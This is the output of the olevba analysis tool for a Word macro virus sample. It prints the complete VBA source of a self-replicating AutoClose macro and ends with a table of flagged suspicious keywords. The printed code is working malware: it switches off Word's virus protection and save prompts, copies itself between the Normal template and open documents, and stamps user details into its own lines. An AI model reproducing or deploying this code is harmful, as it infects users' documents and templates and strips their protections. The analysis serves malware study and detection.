olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-77bd95c8a253cb4afb9a2041ca24eb0df00863a6
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-77bd95c8a253cb4afb9a2041ca24eb0df00863a6 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
On Error Resume Next
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
IU91 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Options.SaveNormalPrompt = 0
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
TK52 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Options.ConfirmConversions = 0
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Options.VirusProtection = 0
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Application.EnableCancelKey = 0
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If IU91 > 0 And TK52 > 0 Then GoTo AK63
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If IU91 = 0 Then
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Set QV81 = ActiveDocument.VBProject.VBComponents.Item(1)
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
MS37 = True
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
End If
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If TK52 = 0 Then
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Set QV81 = NormalTemplate.VBProject.VBComponents.Item(1)
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
FV81 = True
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
End If
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If FV81 <> True And MS37 <> True Then GoTo AK63
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If FV81 = True Then QV81.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, IU91 - 1))
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
If MS37 = True Then QV81.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, TK52 - 1))
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
With QV81.CodeModule
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
For x = 2 To (QV81.CodeModule.CountOfLines - 1) Step 2
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
Next x
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
End With
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
AK63:
'TesterT00013324.DOC00013324.DOC2/23/01 5:52:51 PM
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

